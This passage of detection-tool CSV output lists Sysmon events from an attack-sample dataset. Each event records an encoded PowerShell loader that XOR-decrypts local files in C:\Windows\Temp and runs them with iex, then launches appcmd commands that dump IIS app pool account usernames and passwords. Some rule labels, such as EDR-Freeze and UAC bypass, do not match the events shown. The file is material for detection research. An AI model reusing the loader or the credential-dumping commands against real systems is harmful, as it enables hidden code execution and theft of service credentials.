AAoACQAZABlAGMAXwBtAG8AZAB1AGwAZQArACQAZABlAGMAXwBhAHAAcABfAGMAbwBkAGUAKQB8AGkAZQB4ADsAUgBlAG0AbwB2AGUALQBJAHQAZQBtACAALQBQAGEAdABoACAAJABwAGEAdABoAF8AaQBuAF8AYQBwAHAAXwBjAG8AZABlACAALQBGAG8AcgBjAGUAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0ATgB1AGwAbAA7AA=='
Product: Internet Information Services
Company: Microsoft Corporation
ParentProcessId: 2584
LogonGuid: 365ABB72-B26B-5CEA-0000-002023240800
Hashes: SHA1=C5423FEF0E8E211BB8BAB9C11E730048BBED7B29,MD5=0E5BC786206A3762CE47A0A2DBD01D7B,SHA256=113F68086A3F02276395CB70C72B00ED33A47FD00820D229093CD6ADDC2F73F4,IMPHASH=1697BBEAB0AC62DD7B8016CE25425F45
ParentProcessGuid: 365ABB72-3D4A-5CEB-0000-0010FA93FD00
ProcessId: 3100
CurrentDirectory: C:\Windows\Temp\
ProcessGuid: 365ABB72-3D6E-5CEB-0000-00104C92FF00
CommandLine: '""C:\Windows\System32\inetsrv\appcmd.exe""  list apppool ""Description: Cannot read configuration file due to insufficient permissions"" /text:processmodel.password'
FileVersion: 7.5.7600.16385 (win7_rtm.090713-1255)
User: IIS APPPOOL\DefaultAppPool
LogonId: '0x82423'
IntegrityLevel: High
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
UtcTime: 2019-05-27 01:29:18.322
"
2019-05-27T01:29:18.432370+00:00,Hacktool - EDR-Freeze Execution;UAC Bypass Using NTFS Reparse Point - Process,data/EVTX-ATTACK-SAMPLES/Credential Access/discovery_sysmon_1_iis_pwd_and_config_discovery_appcmd.evtx,1,Microsoft-Windows-Sysmon,1,5925,IEWIN7,"Image: C:\Windows\System32\inetsrv\appcmd.exe
RuleName: ''
Description: Application Server Command Line Admin Tool
TerminalSessionId: 0
ParentCommandLine: '""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe""  -nop -noni -enc JABQAHIAbwBnAHIAZQBzAHMAUAByAGUAZgBlAHIAZQBuAGMAZQAgAD0AIAAiAFMAaQBsAGUAbgB0AGwAeQBDAG8AbgB0AGkAbgB1AGUAIgA7ACQAcABhAHQAaABfAGkAbgBfAG0AbwBkAHUAbABlAD0AIgBDADoAXABXAGkAbgBkAG8AdwBzAFwAVABlAG0AcABcADYAagByAHgAawAzAFwAZwBmAGcAOQBpACIAOwAkAHAAYQB0AGgAXwBpAG4AXwBhAHAAcABfAGMAbwBkAGUAPQAiAEMAOgBcAFcAaQBuAGQAbwB3AHMAXABUAGUAbQBwAFwANgBqAHIAeABrADMAXABuAGoAYQA5AHQANgA0AHIAcgBsAHUAOAAiADsAJABrAGUAeQA9AFsAUwB5AHMAdABlAG0ALgBUAGUAeAB0AC4ARQBuAGMAbwBkAGkAbgBnAF0AOgA6AFUAVABGADgALgBHAGUAdABCAHkAdABlAHMAKAAnADgAZAA5ADYAOQBlAGUAZgA2AGUAYwBhAGQAMwBjADIAOQBhADMAYQA2ADIAOQAyADgAMABlADYAOAA2AGMAZgAwAGMAMwBmADUAZAA1AGEAOAA2AGEAZgBmADMAYwBhADEAMgAwADIAMABjADkAMgAzAGEAZABjADYAYwA5ADIAJwApADsAJABlAG4AYwBfAG0AbwBkAHUAbABlAD0AWwBTAHkAcwB0AGUAbQAuAEkATwAuAEYAaQBsAGUAXQA6ADoAUgBlAGEAZABBAGwAbABCAHkAdABlAHMAKAAkAHAAYQB0AGgAXwBpAG4AXwBtAG8AZAB1AGwAZQApADsAJABlAG4AYwBfAGEAcABwAF8AYwBvAGQAZQA9AFsAUwB5AHMAdABlAG0ALgBJAE8ALgBGAGkAbABlAF0AOgA6AFIAZQBhAGQAQQBsAGwAQgB5AHQAZQBzACgAJABwAGEAdABoAF8AaQBuAF8AYQBwAHAAXwBjAG8AZABlACkAOwAkAGQAZQBjAF8AbQBvAGQAdQBsAGUAPQBOAGUAdwAtAE8AYgBqAGUAYwB0ACAAQgB5AHQAZQBbAF0AIAAkAGUAbgBjAF8AbQBvAGQAdQBsAGUALgBMAGUAbgBnAHQAaAA7ACQAZABlAGMAXwBhAHAAcABfAGMAbwBkAGUAPQBOAGUAdwAtAE8AYgBqAGUAYwB0ACAAQgB5AHQAZQBbAF0AIAAkAGUAbgBjAF8AYQBwAHAAXwBjAG8AZABlAC4ATABlAG4AZwB0AGgAOwBmAG8AcgAgACgAJABpACAAPQAgADAAOwAgACQAaQAgAC0AbAB0ACAAJABlAG4AYwBfAG0AbwBkAHUAbABlAC4ATABlAG4AZwB0AGgAOwAgACQAaQArACsAKQAgAHsAJABkAGUAYwBfAG0AbwBkAHUAbABlAFsAJABpAF0AIAA9ACAAJABlAG4AYwBfAG0AbwBkAHUAbABlAFsAJABpAF0AIAAtAGIAeABvAHIAIAAkAGsAZQB5AFsAJABpACAAJQAgACQAawBlAHkALgBMAGUAbgBnAHQAaABdADsAfQA7AGYAbwByACAAKAAkAGkAIAA9ACAAMAA7ACAAJABpACAALQBsAHQAIAAkAGUAbgBjAF8AYQBwAHAAXwBjAG8AZABlAC4ATABlAG4AZwB0AGgAOwAgACQAaQArACsAKQAgAHsAJABkAGUAYwBfAGEAcABwAF8AYwBvAGQAZQBbACQAaQBdACAAPQAgACQAZQBuAGMAXwBhAHAAcABfAGMAbwBkAGUAWwAkAGkAXQAgAC0AYgB4AG8AcgAgACQAawBlAHkAWwAkAGkAIAAlACAAJABrAGUAeQAuAEwAZQBuAGcAdABoAF0AOwB9ADsAJABkAGUAYwBfAG0AbwBkAHUAbABlAD0AWwBTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBFAG4AYwBvAGQAaQBuAGcAXQA6ADoAVQBUAEYAOAAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABkAGUAYwBfAG0AbwBkAHUAbABlACkAOwAkAGQAZQBjAF8AYQBwAHAAXwBjAG8AZABlAD0AWwBTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBFAG4AYwBvAGQAaQBuAGcAXQA6ADoAVQBUAEYAOAAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABkAGUAYwBfAGEAcABwAF8AYwBvAGQAZQApADsAJAAoACQAZABlAGMAXwBtAG8AZAB1AGwAZQArACQAZABlAGMAXwBhAHAAcABfAGMAbwBkAGUAKQB8AGkAZQB4ADsAUgBlAG0AbwB2AGUALQBJAHQAZQBtACAALQBQAGEAdABoACAAJABwAGEAdABoAF8AaQBuAF8AYQBwAHAAXwBjAG8AZABlACAALQBGAG8AcgBjAGUAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0ATgB1AGwAbAA7AA=='
Product: Internet Information Services
Company: Microsoft Corporation
ParentProcessId: 2584
LogonGuid: 365ABB72-B26B-5CEA-0000-002023240800
Hashes: SHA1=C5423FEF0E8E211BB8BAB9C11E730048BBED7B29,MD5=0E5BC786206A3762CE47A0A2DBD01D7B,SHA256=113F68086A3F02276395CB70C72B00ED33A47FD00820D229093CD6ADDC2F73F4,IMPHASH=1697BBEAB0AC62DD7B8016CE25425F45
ParentProcessGuid: 365ABB72-3D4A-5CEB-0000-0010FA93FD00
ProcessId: 3136
CurrentDirectory: C:\Windows\Temp\
ProcessGuid: 365ABB72-3D6E-5CEB-0000-00100C96FF00
CommandLine: '""C:\Windows\System32\inetsrv\appcmd.exe""  list apppool /text:processmodel.username'
FileVersion: 7.5.7600.16385 (win7_rtm.090713-1255)
User: IIS APPPOOL\DefaultAppPool
LogonId: '0x82423'
IntegrityLevel: High
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
UtcTime: 2019-05-27 01:29:18.392
"
2019-05-27T01:29:18.522500+00:00,Hacktool - EDR-Freeze Execution;Microsoft IIS Service Account Password Dumped;UAC Bypass Using NTFS Reparse Point - Process,data/EVTX-ATTACK-SAMPLES/Credential Access/discovery_sysmon_1_iis_pwd_and_config_discovery_appcmd.evtx,1,Microsoft-Windows-Sysmon,1,5928,IEWIN7,"Image: C:\Windows\System32\inetsrv\appcmd.exe
RuleName: ''
Description: Application Server Command Line Admin Tool
TerminalSessionId: 0
ParentCommandLine: '""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe""  -nop -noni -enc JABQAHIAbwBnAHIAZQBzAHMAUAByAGUAZgBlAHIAZQBuAGMAZQAgAD0AIAAiAFMAaQBsAGUAbgB0AGwAeQBDAG8AbgB0AGkAbgB1AGUAIgA7ACQAcABhAHQAaABfAGkAbgBfAG0AbwBkAHUAbABlAD0AIgBDADoAXABXAGkAbgBkAG8AdwBzAFwAVABlAG0AcABcADYAagByAHgAawAzAFwAZwBmAGcAOQBpACIAOwAkAHAAYQB0AGgAXwBpAG4AXwBhAHAAcABfAGMAbwBkAGUAPQAiAEMAOgBcAFcAaQBuAGQAbwB3AHMAXABUAGUAbQBwAFwANgBqAHIAeABrADMAXABuAGoAYQA5AHQANgA0AHIAcgBsAHUAOAAiADsAJABrAGUAeQA9AFsAUwB5AHMAdABlAG0ALgBUAGUAeAB0AC4ARQBuAGMAbwBkAGkAbgBnAF0AOgA6AFUAVABGADgALgBHAGUAdABCAHkAdABlAHMAKAAnADgAZAA5ADYAOQBlAGUAZgA2AGUAYwBhAGQAMwBjADIAOQBhADMAYQA2ADIAOQAyADgAMABlADYAOAA2AGMAZgAwAGMAMwBmADUAZAA1AGEAOAA2AGEAZgBmADMAYwBhADEAMgAwADIAMABjADkAMgAzAGEAZABjADYAYwA5ADIAJwApADsAJABlAG4AYwBfAG0AbwBkAHUAbABlAD0AWwBTAHkAcwB0AGUAbQAuAEkATwAuAEYAaQBsAGUAXQA6ADoAUgBlAGEAZABBAGwAbABCAHkAdABlAHMAKAAkAHAAYQB0AGgAXwBpAG4AXwBtAG8AZAB1AGwAZQApADsAJABlAG4AYwBfAGEAcABwAF8AYwBvAGQAZQA9AFsAUwB5AHMAdABlAG0ALgBJAE8ALgBGAGkAbABlAF0AOgA6AFIAZQBhAGQAQQBsAGwAQgB5AHQAZQBzACgAJABwAGEAdABoAF8AaQBuAF8AYQBwAHAAXwBjAG8AZABlACkAOwAkAGQAZQBjAF8AbQBvAGQAdQBsAGUAPQBOAGUAdwAtAE8AYgBqAGUAYwB0ACAAQgB5AHQAZQBbAF0AIAAkAGUAbgBjAF8AbQBvAGQAdQBsAGUALgBMAGUAbgBnAHQAaAA7ACQAZABlAGMAXwBhAHAAcABfAGMAbwBkAGUAPQBOAGUAdwAtAE8AYgBqAGUAYwB0ACAAQgB5AHQAZQBbAF0AIAAkAGUAbgBjAF8AYQBwAHAAXwBjAG8AZABlAC4ATABlAG4AZwB0AGgAOwBmAG8AcgAgACgAJABpACAAPQAgADAAOwAgACQAaQAgAC0AbAB0ACAAJABlAG4AYwBfAG0AbwBkAHUAbABlAC4ATABlAG4AZwB0AGgAOwAgACQAaQArACsAKQAgAHsAJABkAGUAYwBfAG0AbwBkAHUAbABlAFsAJABpAF0AIAA9ACAAJABlAG4AYwBfAG0AbwBkAHUAbABlAFsAJABpAF0AIAAtAGIAeABvAHIAIAAkAGsAZQB5AFsAJABpACAAJQAgACQAawBlAHkALgBMAGUAbgBnAHQAaABdADsAfQA7AGYAbwByACAAKAAkAGkAIAA9ACAAMAA7ACAAJABpACAALQBsAHQAIAAkAGUAbgBjAF8AYQBwAHAAXwBjAG8AZABlAC4ATABlAG4AZwB0AGgAOwAgACQAaQArACsAKQAgAHsAJABkAGUAYwBfAGEAcABwAF8AYwBvAGQAZQBbACQAaQBdACAAPQAgACQAZQBuAGMAXwBhAHAAcABfAGMAbwBkAGUAWwAkAGkAXQAgAC0AYgB4AG8AcgAgACQAawBlAHkAWwAkAGkAIAAlACAAJABrAGUAeQAuAEwAZQBuAGcAdABoAF0AOwB9ADsAJABkAGUAYwBfAG0AbwBkAHUAbABlAD0AWwBTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBFAG4AYwBvAGQAaQBuAGcAXQA6ADoAVQBUAEYAOAAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABkAGUAYwBfAG0AbwBkAHUAbABlACkAOwAkAGQAZQBjAF8AYQBwAHAAXwBjAG8AZABlAD0AWwBTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBFAG4AYwBvAGQAaQBuAGcAXQA6ADoAVQBUAEYAOAAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABkAGUAYwBfAGEAcABwAF8AYwBvAGQAZQApADsAJAAoACQAZABlAGMAXwBtAG8AZAB1AGwAZQArACQAZABlAGMAXwBhAHAAcABfAGMAbwBkAGUAKQB8AGkAZQB4ADsAUgBlAG0AbwB2AGUALQBJAHQAZQBtACAALQBQAGEAdABoACAAJABwAGEAdABoAF8AaQBuAF8AYQBwAHAAXwBjAG8AZABlACAALQBGAG8AcgBjAGUAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0ATgB1AGwAbAA7AA=='
Product: Internet Information Services
Company: Microsoft Corporation
ParentProcessId: 2584
LogonGuid: 365ABB72-B26B-5CEA-0000-002023240800
Hashes: SHA1=C5423FEF0E8E211BB8BAB9C11E730048BBED7B29,MD5=0E5BC786206A3762CE47A0A2DBD01D7B,SHA256=113F68086A3F02276395CB70C72B00ED33A47FD00820D229093CD6ADDC2F73F4,IMPHASH=1697BBEAB0AC62DD7B8016CE25425F45
ParentProcessGuid: 365ABB72-3D4A-5CEB-0000-0010FA93FD00
ProcessId: 344
CurrentDirectory: C:\Windows\Temp\
ProcessGuid: 365ABB72-3D6E-5CEB-0000-0010CC99FF00
CommandLine: '""C:\Windows\System32\inetsrv\appcmd.exe""  list apppool /text:processmodel.password'
FileVersion: 7.5.7600.16385 (win7_rtm.090713-1255)
User: IIS APPPOOL\DefaultAppPool
LogonId: '0x82423'
IntegrityLevel: High
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
UtcTime: 2019-05-27 01:29:18.472
"
2019-05-27T01:29:18.662701+00:00,Hacktool - EDR-Freeze Execution;UAC Bypass Using NTFS Reparse Point - Process,data/EVTX-ATTACK-SAMPLES/Credential Access/discovery_sysmon_1_iis_pwd_and_config_discovery_appcmd.evtx,1,Microsoft-Windows-Sysmon,1,5931,IEWIN7,"Image: C:\Windows\System32\inetsrv\appcmd.exe
RuleName: ''
Description: Application Server Command Line Admin Tool
TerminalSessionId: 0
ParentCommandLine: '""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe""  -nop -noni -enc JABQAHIAbwBnAHIAZQBzAHMAUAByAGUAZgBlAHIAZQBuAGMAZQAgAD0AIAAiAFMAaQBsAGUAbgB0AGwAeQBDAG8AbgB0AGkAbgB1AGUAIgA7ACQAcABhAHQAaABfAGkAbgBfAG0AbwBkAHUAbABlAD0AIgBDADoAXABXAGkAbgBkAG8AdwBzAFwAVABlAG0AcABcADYAagByAHgAawAzAFwAZwBmAGcAOQBpACIAOwAkAHAAYQB0AGgAXwBpAG4AXwBhAHAAcABfAGMAbwBkAGUAPQAiAEMAOgBcAFcAaQBuAGQAbwB3AHMAXABUAGUAbQBwAFwANgBqAHIAeABrADMAXABuAGoAYQA5AHQANgA0AHIAcgBsAHUAOAAiADsAJABrAGUAeQA9AFsAUwB5AHMAdABlAG0ALgBUAGUAeAB0AC4ARQBuAGMAbwBkAGkAbgBnAF0AOgA6AFUAVABGADgALgBHAGUAdABCAHkAdABlAHMAKAAnADgAZAA5ADYAOQBlAGUAZgA2AGUAYwBhAGQAMwBjADIAOQBhADMAYQA2ADIAOQAyADgAMABlADYAOAA2AGMAZgAwAGMAMwBmADUAZAA1AGEAOAA2AGEAZgBmADMAYwBhADEAMgAwADIAMABjADkAMgAzAGEAZABjADYAYwA5ADIAJwApADsAJABlAG4AYwBfAG0AbwBkAHUAbABlAD0AWwBTAHkAcwB0AGUAbQAuAEkATwAuAEYAaQBsAGUAXQA6ADoAUgBlAGEAZABBAGwAbABCAHkAdABlAHMAKAAkAHAAYQB0AGgAXwBpAG4AXwBtAG8AZAB1AGwAZQApADsAJABlAG4AYwBfAGEAcABwAF8AYwBvAGQAZQA9AFsAUwB5AHMAdABlAG0ALgBJAE8ALgBGAGkAbABlAF0AOgA6AFIAZQBhAGQAQQBsAGwAQgB5AHQAZQBzACgAJABwAGEAdABoAF8AaQBuAF8AYQBwAHAAXwBjAG8AZABlACkAOwAkAGQAZQBjAF8AbQBvAGQAdQBsAGUAPQBOAGUAdwAtAE8AYgBqAGUAYwB0ACAAQgB5AHQAZQBbAF0AIAAkAGUAbgBjAF8AbQBvAGQAdQBsAGUALgBMAGUAbgBnAHQAaAA7ACQAZABlAGMAXwBhAHAAcABfAGMAbwBkAGUAPQBOAGUAdwAtAE8AYgBqAGUAYwB0ACAAQgB5AHQAZQBbAF0AIAAkAGUAbgBjAF8AYQBwAHAAXwBjAG8AZABlAC4ATABlAG4AZwB0AGgAOwBmAG8AcgAgACgAJABpACAAPQAgADAAOwAgACQAaQAgAC0AbAB0ACAAJABlAG4AYwBfAG0AbwBkAHUAbABlAC4ATABlAG4AZwB0AGgAOwAgACQAaQArACsAKQAgAHsAJABkAGUAYwBfAG0AbwBkAHUAbABlAFsAJABpAF0AIAA9ACAAJABlAG4AYwBfAG0AbwBkAHUAbABlAFsAJABpAF0AIAAtAGIAeABvAHIAIAAkAGsAZQB5AFsAJABpACAAJQAgACQAawBlAHkALgBMAGUAbgBnAHQAaABdADsAfQA7AGYAbwByACAAKAAkAGkAIAA9ACAAMAA7ACAAJABpACAALQBsAHQAIAAkAGUAbgBjAF8AYQBwAHAAXwBjAG8AZABlAC4ATABlAG4AZwB0AGgAOwAgACQAaQArACsAKQAgAHsAJABkAGUAYwBfAGEAcABwAF8AYwBvAGQAZQBbACQAaQBdACAAPQAgACQAZQBuAGMAXwBhAHAAcABfAGMAbwBkAGUAWwAkAGkAXQAgAC0AYgB4AG8AcgAgACQAawBlAHkAWwAkAGkAIAAlACAAJABrAGUAeQAuAEwAZQBuAGcAdABoAF0AOwB9ADsAJABkAGUAYwBfAG0AbwBkAHUAbABlAD0AWwBTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBFAG4AYwBvAGQAaQBuAGcAXQA6ADoAVQBUAEYAOAAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABkAGUAYwBfAG0AbwBkAHUAbABlACkAOwAkAGQAZQBjAF8AYQBwAHAAXwBjAG8AZABlAD0AWwBTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBFAG4AYwBvAGQAaQBuAGcAXQA6ADoAVQBUAEYAOAAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABkAGUAYwBfAGEAcABwAF8AYwBvAGQAZQApADsAJAAoACQAZABlAGMAXwBtAG8AZAB1AGwAZQArACQAZABlAGMAXwBhAHAAcABfAGMAbwBkAGUAKQB8AGkAZQB4ADsAUgBlAG0AbwB2AGUALQBJAHQAZQBtACAALQBQAGEAdABoACAAJABwAGEAdABoAF8AaQBuAF8AYQBwAHAAXwBjAG8AZABlACAALQBGAG8AcgBjAGUAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0ATgB1AGwAbAA7AA=='
Product: Internet Information Services
Company: Microsoft Corporation
ParentProcessId: 2584
LogonGuid: 365ABB72-B26B-5CEA-0000-002023240800
Hashes: SHA1=C5423FEF0E8E211BB8BAB9C11E730048BBED7B29,MD5=0E5BC786206A3762CE47A0A2DBD01D7B,SHA256=113F68086A3F02276395CB70C72B00ED33A47FD00820D229093CD6ADDC2F73F4,IMPHASH=1697BBEAB0AC62DD7B8016CE25425F45
ParentProcessGuid: 365ABB72-3D4A-5CEB-0000-0010FA93FD00
ProcessId: 3756
CurrentDirectory: C:\Windows\Temp\
ProcessGuid: 365ABB72-3D6E-5CEB-0000-0010EF9EFF00
CommandLine: '""C:\Windows\System32\inetsrv\appcmd.exe""  list apppool "". )"" /text:processmodel.username'
FileVersion: 7.5.7600.16385 (win7_rtm.090713-1255)
User: IIS APPPOOL\DefaultAppPool
LogonId: '0x82423'
IntegrityLevel: High
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
UtcTime: 2019-05-27 01:29:18.622
"
2019-05-27T01:29:18.742817+00:00,Hacktool - EDR-Freeze Execution;Microsoft IIS Service Account Password Dumped;UAC Bypass Using NTFS Reparse Point - Process,data/EVTX-ATTACK-SAMPLES/Credential Access/discovery_sysmon_1_iis_pwd_and_config_discovery_appcmd.evtx,1,Microsoft-Windows-Sysmon,1,5934,IEWIN7,"Image: C:\Windows\System32\inetsrv\appcmd.exe
RuleName: ''
Description: Application Server Command Line Admin Tool
TerminalSessionId: 0
ParentCommandLine: '""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe""  -nop -noni -enc JABQAHIAbwBnAHIAZQBzAHMAUAByAGUAZgBlAHIAZQBuAGMAZQAgAD0AIAAiAFMAaQBsAGUAbgB0AGwAeQBDAG8AbgB0AGkAbgB1AGUAIgA7ACQAcABhAHQAaABfAGkAbgBfAG0AbwBkAHUAbABlAD0AIgBDADoAXABXAGkAbgBkAG8AdwBzAFwAVABlAG0AcABcADYAagByAHgAawAzAFwAZwBmAGcAOQBpACIAOwAkAHAAYQB0AGgAXwBpAG4AXwBhAHAAcABfAGMAbwBkAGUAPQAiAEMAOgBcAFcAaQBuAGQAbwB3AHMAXABUAGUAbQBwAFwANgBqAHIAeABrADMAXABuAGoAYQA5AHQANgA0AHIAcgBsAHUAOAAiADsAJABrAGUAeQA9AFsAUwB5AHMAdABlAG0ALgBUAGUAeAB0AC4ARQBuAGMAbwBkAGkAbgBnAF0AOgA6AFUAVABGADgALgBHAGUAdABCAHkAdABlAHMAKAAnADgAZAA5ADYAOQBlAGUAZgA2AGUAYwBhAGQAMwBjADIAOQBhADMAYQA2ADIAOQAyADgAMABlADYAOAA2AGMAZgAwAGMAMwBmADUAZAA1AGEAOAA2AGEAZgBmADMAYwBhADEAMgAwADIAMABjADkAMgAzAGEAZABjADYAYwA5ADIAJwApADsAJABlAG4AYwBfAG0AbwBkAHUAbABlAD0AWwBTAHkAcwB0AGUAbQAuAEkATwAuAEYAaQBsAGUAXQA6ADoAUgBlAGEAZABBAGwAbABCAHkAdABlAHMAKAAkAHAAYQB0AGgAXwBpAG4AXwBtAG8AZAB1AGwAZQApADsAJABlAG4AYwBfAGEAcABwAF8AYwBvAGQAZQA9AFsAUwB5AHMAdABlAG0ALgBJAE8ALgBGAGkAbABlAF0AOgA6AFIAZQBhAGQAQQBsAGwAQgB5AHQAZQBzACgAJABwAGEAdABoAF8AaQBuAF8AYQBwAHAAXwBjAG8AZABlACkAOwAkAGQAZQBjAF8AbQBvAGQAdQBsAGUAPQBOAGUAdwAtAE8AYgBqAGUAYwB0ACAAQgB5AHQAZQBbAF0AIAAkAGUAbgBjAF8AbQBvAGQAdQBsAGUALgBMAGUAbgBnAHQAaAA7ACQAZABlAGMAXwBhAHAAcABfAGMAbwBkAGUAPQBOAGUAdwAtAE8AYgBqAGUAYwB0ACAAQgB5AHQAZQBbAF0AIAAkAGUAbgBjAF8AYQBwAHAAXwBjAG8AZABlAC4ATABlAG4AZwB0AGgAOwBmAG8AcgAgACgAJABpACAAPQAgADAAOwAgACQAaQAgAC0AbAB0ACAAJABlAG4AYwBfAG0AbwBkAHUAbABlAC4ATABlAG4AZwB0AGgAOwAgACQAaQArACsAKQAgAHsAJABkAGUAYwBfAG0AbwBkAHUAbABlAFsAJABpAF0AIAA9ACAAJABlAG4AYwBfAG0AbwBkAHUAbABlAFsAJABpAF0AIAAtAGIAeABvAHIAIAAkAGsAZQB5AFsAJABpACAAJQAgACQAawBlAHkALgBMAGUAbgBnAHQAaABdADsAfQA7AGYAbwByACAAKAAkAGkAIAA9ACAAMAA7ACAAJABpACAALQBsAHQAIAAkAGUAbgBjAF8AYQBwAHAAXwBjAG8AZABlAC4ATABlAG4AZwB0AGgAOwAgACQAaQArACsAKQAgAHsAJABkAGUAYwBfAGEAcABwAF8AYwBvAGQAZQBbACQAaQBdACAAPQAgACQAZQBuAGMAXwBhAHAAcABfAGMAbwBkAGUAWwAkAGkAXQAgAC0AYgB4AG8AcgAgACQAawBlAHkAWwAkAGkAIAAlACAAJABrAGUAeQAuAEwAZQBuAGcAdABoAF0AOwB9ADsAJABkAGUAYwBfAG0AbwBkAHUAbABlAD0AWwBTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBFAG4AYwBvAGQAaQBuAGcAXQA6ADoAVQBUAEYAOAAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABkAGUAYwBfAG0AbwBkAHUAbABlACkAOwAkAGQAZQBjAF8AYQBwAHAAXwBjAG8AZABlAD0AWwBTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBFAG4AYwBvAGQAaQBuAGcAXQA6ADoAVQBUAEYAOAAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABkAGUAYwBfAGEAcABwAF8AYwBvAGQAZQApADsAJAAoACQAZABlAGMAXwBtAG8AZAB1AGwAZQArACQAZABlAGMAXwBhAHAAcABfAGMAbwBkAGUAKQB8AGkAZQB4ADsAUgBlAG0AbwB2AGUALQBJAHQAZQBtACAALQBQAGEAdABoACAAJABwAGEAdABoAF8AaQBuAF8AYQBwAHAAXwBjAG8AZABlACAALQBGAG8AcgBjAGUAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0ATgB1AGwAbAA7AA=='
Product: Internet Information Services
Company: Microsoft Corporation
ParentProcessId: 2584
LogonGuid: 365ABB72-B26B-5CEA-0000-002023240800
Hashes: SHA1=C5423FEF0E8E211BB8BAB9C11E730048BBED7B29,MD5=0E5BC786206A3762CE47A0A2DBD01D7B,SHA256=113F68086A3F02276395CB70C72B00ED33A47FD00820D229093CD6ADDC2F73F4,IMPHASH=1697BBEAB0AC62DD7B8016CE25425F45
ParentProcessGuid: 365ABB72-3D4A-5CEB-0000-0010FA93FD00
ProcessId: 3812
CurrentDirectory: C:\Windows\Temp\
ProcessGuid: 365ABB72-3D6E-5CEB-0000-0010AFA2FF00
CommandLine: '""C:\Windows\System32\inetsrv\appcmd.exe""  list apppool "". )"" /text:processmodel.password'
FileVersion: 7.5.7600.16385 (win7_rtm.090713-1255)
User: IIS APPPOOL\DefaultAppPool
LogonId: '0x82423'
IntegrityLevel: High
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
UtcTime: 2019-05-27 01:29:18.702
"
2019-05-27T01:29:18.822932+00:00,Hacktool - EDR-Freeze Execution;UAC Bypass Using NTFS Reparse Point - Process,data/EVTX-ATTACK-SAMPLES/Credential Access/discovery_sysmon_1_iis_pwd_and_config_discovery_appcmd.evtx,1,Microsoft-Windows-Sysmon,1,5937,IEWIN7,"Image: C:\Windows\System32\inetsrv\appcmd.exe
RuleName: ''
Description: Application Server Command Line Admin Tool
TerminalSessionId: 0
ParentCommandLine: '""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe""  -nop -noni -enc JABQAHIAbwBnAHIAZQBzAHMAUAByAGUAZgBlAHIAZQBuAGMAZQAgAD0AIAAiAFMAaQBsAGUAbgB0AGwAeQBDAG8AbgB0AGkAbgB1AGUAIgA7ACQAcABhAHQAaABfAGkAbgBfAG0AbwBkAHUAbABlAD0AIgBDADoAXABXAGkAbgBkAG8AdwBzAFwAVABlAG0AcABcADYAagByAHgAawAzAFwAZwBmAGcAOQBpACIAOwAkAHAAYQB0AGgAXwBpAG4AXwBhAHAAcABfAGMAbwBkAGUAPQAiAEMAOgBcAFcAaQBuAGQAbwB3AHMAXABUAGUAbQBwAFwANgBqAHIAeABrADMAXABuAGoAYQA5AHQANgA0AHIAcgBsAHUAOAAiADsAJABrAGUAeQA9AFsAUwB5AHMAdABlAG0ALgBUAGUAeAB0AC4ARQBuAGMAbwBkAGkAbgBnAF0AOgA6AFUAVABGADgALgBHAGUAdABCAHkAdABlAHMAKAAnADgAZAA5ADYAOQBlAGUAZgA2AGUAYwBhAGQAMwBjADIAOQBhADMAYQA2ADIAOQAyADgAMABlADYAOAA2AGMAZgAwAGMAMwBmADUAZAA1AGEAOAA2AGEAZgBmADMAYwBhADEAMgAwADIAMABjADkAMgAzAGEAZABjADYAYwA5ADIAJwApADsAJABlAG4AYwBfAG0AbwBkAHUAbABlAD0AWwBTAHkAcwB0AGUAbQAuAEkATwAuAEYAaQBsAGUAXQA6ADoAUgBlAGEAZABBAGwAbABCAHkAdABlAHMAKAAkAHAAYQB0AGgAXwBpAG4AXwBtAG8AZAB1AGwAZQApADsAJABlAG4AYwBfAGEAcABwAF8AYwBvAGQAZQA9AFsAUwB5AHMAdABlAG0ALgBJAE8ALgBGAGkAbABlAF0AOgA6AFIAZQBhAGQAQQBsAGwAQgB5AHQAZQBzACgAJABwAGEAdABoAF8AaQBuAF8AYQBwAHAAXwBjAG8AZABlACkAOwAkAGQAZQBjAF8AbQBvAGQAdQBsAGUAPQBOAGUAdwAtAE8AYgBqAGUAYwB0ACAAQgB5AHQAZQBbAF0AIAAkAGUAbgBjAF8AbQBvAGQAdQBsAGUALgBMAGUAbgBnAHQAaAA7ACQAZABlAGMAXwBhAHAAcABfAGMAbwBkAGUAPQBOAGUAdwAtAE8AYgBqAGUAYwB0ACAAQgB5AHQAZQBbAF0AIAAkAGUAbgBjAF8AYQBwAHAAXwBjAG8AZABlAC4ATABlAG4AZwB0AGgAOwBmAG8AcgAgACgAJABpACAAPQAgADAAOwAgACQAaQAgAC0AbAB0ACAAJABlAG4AYwBfAG0AbwBkAHUAbABlAC4ATABlAG4AZwB0AGgAOwAgACQAaQArACsAKQAgAHsAJABkAGUAYwBfAG0AbwBkAHUAbABlAFsAJABpAF0AIAA9ACAAJABlAG4AYwBfAG0AbwBkAHUAbABlAF